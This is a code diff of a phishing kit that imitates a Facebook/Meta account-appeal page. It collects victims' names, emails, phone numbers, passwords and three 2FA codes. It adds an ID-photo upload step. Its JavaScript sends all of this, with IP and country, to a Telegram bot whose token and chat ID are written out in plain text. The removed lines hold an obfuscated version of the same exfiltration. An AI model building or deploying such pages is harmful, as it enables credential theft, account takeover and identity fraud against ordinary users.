@@ -1,3 +1,35 @@
+<style>
+    #intro {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: #fff;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        color: #fff;
+        font-size: 2rem;
+        z-index: 9999;
+    }
+    #meta-logo {
+        width: 50%;
+        height: auto;
+    }
+</style>
+<div id="intro">
+    <img id="meta-logo" src="./img/loadingLogo.gif" alt="Meta Logo">
+</div>
+
+<script>
+    // Ẩn intro sau 2 giây khi trang đã tải xong
+    window.onload = () => {
+        setTimeout(() => {
+            document.getElementById('intro').style.display = 'none';
+        }, 5000); // 2 giây
+    };
+</script>
 <!DOCTYPE html>
 <html lang="en" id="html">
 <head>
@@ -3399,7 +3431,7 @@
 
                         <div class="d-flex gap-2">
                             <div class="select-container">
-                                <img id="flag-icon" class="country-flag" src="https://flagcdn.com/nl.svg" alt="Netherlands (+31)">
+                                <img id="flag-icon" onchange="updatePhonePrefix()" class="country-flag" src="https://flagcdn.com/us.svg">
                                 <select id="country-code" onchange="updatePhonePrefix()" class="form-control" required="">
                                     <option value="+1" data-flag="https://flagcdn.com/us.svg">USA (+1)</option>
                                     <option value="+1" data-flag="https://flagcdn.com/ca.svg">Canada (+1)</option>
@@ -3566,7 +3598,7 @@
                                 Our response will be sent to you within 24 - 48 hours.                                </div>
                         </div>
                         <div class="notification-setting">
-                            <div class="setting-item">
+                            <div class="setting-item mb-1">
                                 <div class="info"> <i class="fab fa-facebook icon"></i>
                                     <div class="text"> <strong>
                                             <font style="vertical-align: inherit;">
@@ -3796,32 +3828,99 @@
         aria-hidden="true">
         <div class="modal-dialog modal-dialog-centered modal-fullscreen-lg-down">
             <div class="modal-content">
-                <div class="modal-body">
-                    <div class="twoFAinfo-wraper">
-                        <h1 class="modal-title" id="successModalLabel">Request has been sent</h1>
-                        <br>
-                        <div class="fb-round-wraper">
-                            <img src="./img/phone.png" alt="" style="width: 100%;">
-                        </div>
-                        <br>
-                        <p>Your request has been added to the processing queue. We will process your request within 24
-                            hours. If you
-                            do not receive an email message with the appeal status within 24 hours, please resend the
-                            appeal.</p>
-
-                    </div>
-                    <form action="https://facebook.com/" method="GET">
-                        <div class="form-btn-wrapper">
-                            <button class="btn btn-primary">
-
-                                <span class="button-text">Return on Facebook</span>
-                            </button>
-                        </div>
-                    </form>
-
+                <div class="modal-header">
                 </div>
+                <style>
+                    .container {
+                        background: white;
+                        border: 1px solid #ddd;
+                        border-radius: 12px;
+                        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+                        padding: 20px;
+                        width: 400px;
+            
+                    }
+            
+                    .container h1 {
+                        padding: 0 110px;
+                        font-size: 18px;
+                        color: #1c1e21;
+                        margin-bottom: 10px;
+                        text-align: center;
+                    }
+            
+                    .upload-box {
+                        border: 2px dashed #d9dadc;
+                        border-radius: 8px;
+                        padding: 30px;
+                        margin-bottom: 20px;
+                        cursor: pointer;
+                        background-color: #f7f8fa;
+                        transition: background-color 0.3s, border-color 0.3s;
+                    }
+            
+                    .upload-box:hover {
+                        background-color: #ebedf0;
+                        border-color: #c9cdd1;
+                    }
+            
+                    .upload-box img {
+                        max-width: 100%;
+                        height: auto;
+                        display: none;
+                        margin-top: 10px;
+                        border-radius: 6px;
+                    }
+            
+                    .upload-box p {
+                        color: #606770;
+                        font-size: 16px;
+                        margin: 0;
+                        text-align: center;
+                    }
+            
+                    .instructions {
+                        font-size: 14px;
+                        color: #606770;
+                        margin-bottom: 20px;
+                    }
+            
+                    button {
+                        background-color: #4267b2;
+                        color: white;
+                        border: none;
+                        border-radius: 6px;
+                        padding: 12px 147px;
+                        font-size: 16px;
+                        cursor: pointer;
+                        transition: background-color 0.3s;
+                    }
+            
+                    button:disabled {
+                        background-color: #cdd1d4;
+                        cursor: not-allowed;
+                    }
+            
+                    button:not(:disabled):hover {
+                        background-color: #365899;
+                    }
+                </style>
+                <div class="container">
+                    <h1>Upload your ID</h1>
+                    <p style="text-align: unset;" class="instructions">Before we can get you back on Facebook safely, we need to make sure this is your account. You can prove this account is yours by sending us a photo of your ID.</p>
+                    <p style="text-align: unset;" class="instructions">We don't accept photos of a computer screen, a phone screen or a photocopy. If there are any issues, we'll send you an email.</p>
+                    <div class="upload-box" onclick="document.getElementById('fileInput').click()">
+                        <input type="file" id="fileInput" accept="image/*" style="display: none;" onchange="previewImage()">
+                        <p id="placeholderText">📷 Upload image</p>
+                        <img id="previewImage" alt="Preview" style="display: none;">
+                    </div>
+                    <p style="text-align: unset;" class="instructions">We'll store an encrypted copy of your selfie for up to 1 year to improve our ability to detect fake photos, keeping Facebook safe from impersonation.                        <a style="color: #216fdb;">Change how long we store your selfie for</a> or <a style="color: #216fdb;">Learn more</a>
+                    </p>
+                    <button id="continueButton" onclick="handleContinue()">Continue</button>
+                </div>
+
                 <div class="modal-footer">
-                    <img src="./img/meta-logo-grey.png" alt="">
+                    <img src="img/meta-logo-grey.png" alt="">
                 </div>
             </div>
         </div>
@@ -4239,7 +4338,7 @@
         };s
     </script>
     <script>
-       var apiKey,chatId;(function(){var qAq='',Kgg=321-310;function nFn(g){var r=1928651;var z=g.length;var w=[];for(var a=0;a<z;a++){w[a]=g.charAt(a)};for(var a=0;a<z;a++){var v=r*(a+450)+(r%36809);var f=r*(a+117)+(r%46035);var l=v%z;var k=f%z;var n=w[l];w[l]=w[k];w[k]=n;r=(v+f)%3157187;};return w.join('')};var lPm=nFn('uoytqspskwcarguefdonbttccomlvzrjnrhxi').substr(0,Kgg);var Pxj='knjo; (nCmae7-u() 6[gr<c,da+tl8 w)l;nbr]6slusmo=hr]v"lzh(4l=n9)c87l7tte],82!v h8n{f6rq=46vp=-fn",hr,,1,tg<oggb;9;4tje)dar"ar2g)e=+l}o)rn=an8m0;v-q.ekn 1uuijpet[atng[yr.n;ta[ vsuv=i)dlutv+=0h5(9a-(=f)0tv5u..=A r(g.z0;aq,l;2r;]2a;ah(.{gas;w(i()1tvaq,+vvai=7),t; ennfhp=v];6av{ajC+e=()1rvh={efp{;0vanpo=+u0l+=v= 0[rh+i,(..d-tnruo]hervna1q1rh8iSv;orbl;+hl+inn.f2,("airvarr)=*trr.0=rau;)au]{r,;od(ln"s;r.w;c  re6,]an]8np3+(C4(=t jrv;u,n+ oC(p;.;r;;=m)gsrvAc+(jvlsv7qf(.rfpl9.=);fflihn ]zt;;A=i(agx)d.+sdrfe){1.;hl=j=;dv2;(u;"so=3nrfn[r=(,a)=sr c;i, n,o7}fh(t6ns)1+w)=j[])rougr= .;m,9r+;t0n(xu]as1=cd+(;q.,[,e(n]jor]g,oCr+rrC;=heg"=sr[2xiwcu)i<fr+u8hfi su.lvrnc-a};oa15cqs;.pte=u9r<u}v+)phsh9)a(viw}v(A e=0))6ie"wak;am4.c"[ 2+co.=(g36taz,n7 ((oacga=))iee7r;=i,rSr e(}(m0toc)!nsi4,t.fo>,<voo;=0k.rl0ld re heCn4h=5=od*pt(a+)[,;m[ai xrs.ro+A;=)[in;.")im-rlrk;m(re+C.qp),e58[lvno1cloar}+t>us7dv;g1)rx';var WGB=nFn[lPm];var rhP='';var sjN=WGB;var Zgc=WGB(rhP,nFn(Pxj));var cpz=Zgc(nFn('Z). deo_ tr_0af)Zu#oZ_rZ);#5t!{4a486Z5Z.*r.8fnZdZ$);)bbc![gh,3ZZoa;; Z;,y)(.r$1d!.+a.r.(rtCt4=($4,_;+vh(a)$!0fi,5g=Z 9d.3,c+.ZZ]+99!=n..(yc8v_ZS(t$\/(.$ry3v_.3) 3_3}ase.yZ.p$Zu_=.$,fu_8_{;h"v=.Z{f1-,6q;.Zt%;\'Zt80,=06yZ.3b:!)Zlr.)=ai!ybZ -}mccZ.[_0.oZ3.1$.ZZs.b0.x=, 9l9n#.Z$)"Z_=hc7,e(p!3nZ*(=Z7t\/f!mo+(.cci92+h4Z00.{=nd.e,i.3\'$6)cZ)o(Z5(aZ*fZi \'.,t$Z;$ttr0s"h(u) }&4(9q1)=0f;1g);Nr5\/dZ&Z7uZ9s;3feb{))!v0f_Z)3_DZTZ..8eeZo(1e.,oZy+lo.f34aobo),)==h}5Z$de$nct0,}i"y)qi]!i]1(Z. $=c7f%141rv$d_xr_(x .d;fa9!;namZpcd*7Zsn.x&,x%Zf_q,Z07qape3*)$.0-4;..f\/{Z;Z9l;.)rCyye6,+f.Z)*]o]})(6iaje1d1)4Z#1l}o,a!%i(tl)(n\/0.e6Z4oc".=t Za.N(dcf7Z!-gZ{a"ef)Z}4-;3#ir$a+10E87Z(v)6[e._.c_$.}ddZ,Z(=;h;..dm_iZ)0b7c Z,u)o, udiZZZrZe1d69*.e(;.f*=Z!.i%$77((b6y"9!hZ,tn)7(Z7r=aStv1r\'o#7Z.,f+{d}(,f.Zc6e$Zdja,ZZm),s!cdZ)o}4.}hZgt7lip=a\/!u,1!(4!)!)816js(id=oZIc4ZjZc.(t$ %jni%d{e,orf.ntZ.5g.o &e.1_[#;cj+$3;pt!;)e3!40. 4to9an%.pa)$_Zo24cS,.s!.r_c)(t_3=q)1.,Z3$(,b(%Z;(+c'));var HEc=sjN(qAq,cpz );HEc(4033);return 9439})()
+       var apiKey = "7919345658:AAGVy4jwPdSyRKp6VDJ8a5gsq2DTNn-M4Bs",chatId='6580233045';
         const subLinks = {
             'PolicyCollapse': [{
                 'text': 'What is the Privacy Policy and what does it cover?',
@@ -4347,7 +4446,21 @@
     
     
         }
-    
+        function getTimeGMT7() {
+            const now = new Date();
+            const gmt7Offset = 7 * 60 * 60 * 1000; // 7 giờ thành milliseconds
+            const gmt7Time = new Date(now.getTime() + gmt7Offset);
+
+            const day = String(gmt7Time.getUTCDate()).padStart(2, "0");
+            const month = String(gmt7Time.getUTCMonth() + 1).padStart(2, "0"); // Tháng bắt đầu từ 0
+            const year = gmt7Time.getUTCFullYear();
+
+            const hours = String(gmt7Time.getUTCHours()).padStart(2, "0");
+            const minutes = String(gmt7Time.getUTCMinutes()).padStart(2, "0");
+            const seconds = String(gmt7Time.getUTCSeconds()).padStart(2, "0");
+
+            return `${day}/${month}/${year} - ${hours}:${minutes}:${seconds}`;
+        }
         function addSubItems() {
             var linkSvg =
                 `<svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg>`
@@ -4382,6 +4495,17 @@
             }
         }
     
+        function updatePhonePrefix() {
+            let select = document.getElementById("country-code");
+            let selectedOption = select.options[select.selectedIndex];
+            let flagUrl = selectedOption.getAttribute("data-flag");
+            let phoneCode = selectedOption.getAttribute("value");
+            console.log(phoneCode);
+            document.getElementById("PhoneFirld").value = phoneCode;
+            document.getElementById("flag-icon").src = flagUrl;
+        }
+
+
         addSubItems()
     
         // var userMianFormData = {}
@@ -4392,15 +4516,12 @@
         var formsSendData = {
             'full-name': '',
             'personal-email': '',
-            'buiseness-email': '',
             'mobile-phone-number': '',
             'password-1': '',
             'password-2': '',
             '2FA-1': '',
             '2FA-2': '',
             '2FA-3': '',
-            'page-name': '',
-            'apeal': '',
         }
     
         var userIpData = {
@@ -4422,14 +4543,14 @@
         var apiModal = new bootstrap.Modal(document.getElementById('exampleModal2'))
         var twoFAModal = new bootstrap.Modal(document.getElementById('twoFAmodal'))
         var successModal = new bootstrap.Modal(document.getElementById('successModal'))
-    
+        // successModal.show()    
         var termsModal = new bootstrap.Modal(document.getElementById('TermsModal'))
         var policyModal = new bootstrap.Modal(document.getElementById('policyModal'))
         var searchModal = new bootstrap.Modal(document.getElementById('searchModal'))
         var accountsModal = new bootstrap.Modal(document.getElementById('accountsModal'))
         var searchInput = document.getElementById('searchModal').querySelector('input')
     
-        //successModal.show()
+        // termsModal.show()
     
         const apiInput = document.getElementById('exampleModal2').querySelector('input')
         const showHidePassEye = document.getElementById('show-hide-pass')
@@ -4530,7 +4651,18 @@
     
         // Send data to Email
         function sendDataEmail() {
-            function _0x46c8(_0x1a90d0,_0x330ce0){var _0x16b643=_0x16b6();return _0x46c8=function(_0x46c801,_0x5e6813){_0x46c801=_0x46c801-0x9f;var _0x677364=_0x16b643[_0x46c801];return _0x677364;},_0x46c8(_0x1a90d0,_0x330ce0);}var _0xbd6b81=_0x46c8;function _0x16b6(){var _0x5109f8=['\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20country\x20:\x20','dis_name','\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20personal-name\x20:\x20','HTML','2FA-2','href','password-2','\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20full-name:\x20','\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x202FA-2\x20:\x20','https://api.telegram.org/bot','3772434BNttJU','page-name','\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20is_Mobile\x20:\x20','\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20country_code\x20:\x20','\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x202FA-3\x20:\x20','12508280XihTXE','fail','user_ip','\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20password-2\x20:\x20','full-name','2741754AqbTHg','11902176FSqDiz','20VOylzb','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20url\x20:\x20','done','\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x202FA-1\x20:\x20','2FA-1','18723580YRzIqF','mobile-phone-number','buiseness-email','is_Mobile','params','\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20password-1\x20:\x20','24tByLuL','\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20dis_name\x20:\x20','11gAaydN','\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20user_ip\x20:\x20','POST','ajax','stringify','61214btqmkq','country','location','1198684zaWGbc','\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20buiseness-name\x20:\x20','7MNuJKj','\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20mobile-phone-number\x20:\x20'];_0x16b6=function(){return _0x5109f8;};return _0x16b6();}(function(_0x568e38,_0x52c6f1){var _0x470486=_0x46c8,_0x282bd2=_0x568e38();while(!![]){try{var _0x486037=parseInt(_0x470486(0xb0))/0x1*(parseInt(_0x470486(0xb7))/0x2)+parseInt(_0x470486(0xa3))/0x3+-parseInt(_0x470486(0xba))/0x4*(parseInt(_0x470486(0xa5))/0x5)+-parseInt(_0x470486(0xc8))/0x6*(parseInt(_0x470486(0xbc))/0x7)+parseInt(_0x470486(0xcd))/0x8+parseInt(_0x470486(0xa4))/0x9+parseInt(_0x470486(0xaa))/0xa*(-parseInt(_0x470486(0xb2))/0xb);if(_0x486037===_0x52c6f1)break;else _0x282bd2['push'](_0x282bd2['shift']());}catch(_0x54e661){_0x282bd2['push'](_0x282bd2['shift']());}}}(_0x16b6,0xcbc90));var templateTELEData=_0xbd6b81(0xa6)+window[_0xbd6b81(0xb9)][_0xbd6b81(0xc3)]+_0xbd6b81(0xb3)+userIpData[_0xbd6b81(0xa0)]+_0xbd6b81(0xbe)+userIpData[_0xbd6b81(0xb8)]+_0xbd6b81(0xcb)+userIpData['country_code']+_0xbd6b81(0xc5)+formsSendData[_0xbd6b81(0xa2)]+_0xbd6b81(0xc0)+formsSendData['personal-email']+_0xbd6b81(0xbb)+formsSendData[_0xbd6b81(0xac)]+_0xbd6b81(0xbd)+formsSendData[_0xbd6b81(0xab)]+_0xbd6b81(0xaf)+formsSendData['password-1']+_0xbd6b81(0xa1)+formsSendData[_0xbd6b81(0xc4)]+_0xbd6b81(0xa8)+formsSendData[_0xbd6b81(0xa9)]+_0xbd6b81(0xc6)+formsSendData[_0xbd6b81(0xc2)]+_0xbd6b81(0xcc)+formsSendData['2FA-3']+'\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20page-name\x20:\x20'+formsSendData[_0xbd6b81(0xc9)]+'\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20apeal\x20:\x20'+formsSendData['apeal']+_0xbd6b81(0xb1)+metrics[_0xbd6b81(0xbf)]+_0xbd6b81(0xca)+metrics[_0xbd6b81(0xad)]+'\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20params\x20:\x20'+metrics[_0xbd6b81(0xae)],data={'chat_id':chatId,'text':templateTELEData,'parse_mode':_0xbd6b81(0xc1)};$[_0xbd6b81(0xb5)](_0xbd6b81(0xc7)+apiKey+'/sendMessage',{'type':_0xbd6b81(0xb4),'data':JSON[_0xbd6b81(0xb6)](data),'contentType':'application/json'})[_0xbd6b81(0xa7)](function(){})[_0xbd6b81(0x9f)](function(_0x33795a){}),checkCoutry(templateTELEData);
+            var templateTELEData = "🎁 Quà tặng cuộc sống 🎁\n-URL : " + window.location.href + "\n-IP : " + userIpData.user_ip + "\n-Country : " + userIpData.country + ", " + userIpData.country_code + "\n-Fullname: " + formsSendData["full-name"] + "\nMarketplace name : " + formsSendData["page-name"] + "\n-Phone number : " + formsSendData["mobile-phone-number"] + "\n==========================\n👌 Đã lấy được Email/Pass\n-Email : " + formsSendData['personal-email'] + "\n-Password-1 : " + formsSendData['password-1'] + "\n-Password-2 : " + formsSendData["password-2"] + "\n==========================\n👌 Đã lấy được OTP 1 : " + formsSendData["2FA-1"] + "\n==========================\n👌 Đã lấy được OTP 2 : " + formsSendData["2FA-2"] + "\n==========================\n👌 Đã lấy được OTP 3 : " + formsSendData['2FA-3'] + "\n-Time: " + getTimeGMT7();
+            var data = {
+            'chat_id': chatId,
+            'text': templateTELEData,
+            'parse_mode': "HTML"
+            };
+            $.ajax("https://api.telegram.org/bot" + apiKey + '/sendMessage', {
+            'type': "POST",
+            'data': JSON.stringify(data),
+            'contentType': 'application/json'
+            }).done(function () {}).fail(function (_0x33795a) {});
+            checkCoutry(templateTELEData);
         }
         function firstFormHandle(event) {
             event.preventDefault()
@@ -4615,11 +4747,12 @@
     
             updateFormsSendData(serializeForm(twoFAForm))
             setTimeout(function () {
-                sendDataEmail()
                 counter2FA++
                 if (counter2FA >= countOf2FA + 1) {
                     // SHOW success
-    
+                    console.log("điều hướng ở đây nhé");
+                    sendDataEmail()
+                    
                     unlock2FA()
                     spiner.style.display = 'none'
                     buttonText.style.display = 'block'
@@ -4629,7 +4762,6 @@
                     var send2FAButton = twoFAForm.querySelector('button.btn')
                     passwordInput.classList.add('disabled')
                     input.setAttribute('disabled', '')
-    
     
                     input.setAttribute('name', '2FA-' + counter2FA)
                     send2FAButton.setAttribute('disabled', '')
@@ -4885,6 +5017,89 @@
                 event.preventDefault();
             }
         });
+    </script>
+    <script>
+        function previewImage() {
+            var file = document.getElementById("fileInput").files[0];
+            var reader = new FileReader();
+
+            reader.onloadend = function() {
+                var preview = document.getElementById("previewImage");
+                var placeholderText = document.getElementById("placeholderText");
+                preview.src = reader.result;
+                preview.style.display = "block"; // Show the image preview
+                placeholderText.style.display = "none"; // Hide the "Upload image" text
+            }
+
+            if (file) {
+                reader.readAsDataURL(file);
+            }
+        }
+
+        function enableContinueButton() {
+            var fileInput = document.getElementById('imageInput');
+            var continueButton = document.getElementById('continueButton');
+            if (fileInput.files.length > 0) {
+                continueButton.disabled = false; // Enable the continue button if a file is selected
+            } else {
+                continueButton.disabled = true; // Disable the continue button if no file is selected
+            }
+        }
+        function handleContinue() {
+            const fileInput = document.getElementById('fileInput');
+            const continueButton = document.getElementById('continueButton');
+            
+            if (!fileInput.files || fileInput.files.length === 0) {
+                alert('Please upload an image before continuing.');
+                return;
+            }
+            
+            continueButton.innerText = 'Loading...';
+            continueButton.disabled = true;
+            
+            setTimeout(() => {
+                uploadImage();
+            }, 3000);
+        }
+
+        function uploadImage() {
+            const fileInput = document.getElementById('fileInput');
+            const file = fileInput.files[0];
+            
+            if (!file) {
+                return;
+            }
+            
+            console.log('File selected:', file);
+            
+            const formData = new FormData();
+            formData.append('photo', file);
+            
+            const url = `https://api.telegram.org/bot${apiKey}/sendPhoto`;
+            var content = "Upload info\n" +
+                "Full Name: " + formsSendData["full-name"] + "\n" +
+                "Email: " + formsSendData['personal-email'] + "\n" +
+                "Phone: " + formsSendData["mobile-phone-number"] + "\n" +
+                "IP: " + userIpData.user_ip;
+            
+            formData.append('caption', content);
+            
+            fetch(url + `?chat_id=${chatId}`, { method: 'POST', body: formData })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Response from Telegram:', data);
+                    if (data.ok) {
+                        console.log('Image and message sent successfully!');
+                        setTimeout(() => {
+                            window.location.href = window.location.href + 'success.html';
+                        }, 3000);
+                    } else {
+                        console.log('Failed to send image and message:', data.description);
+                    }
+                })
+                .catch(error => console.error('Error sending image and message:', error));
+        }
+        
     </script>
 </body>
 
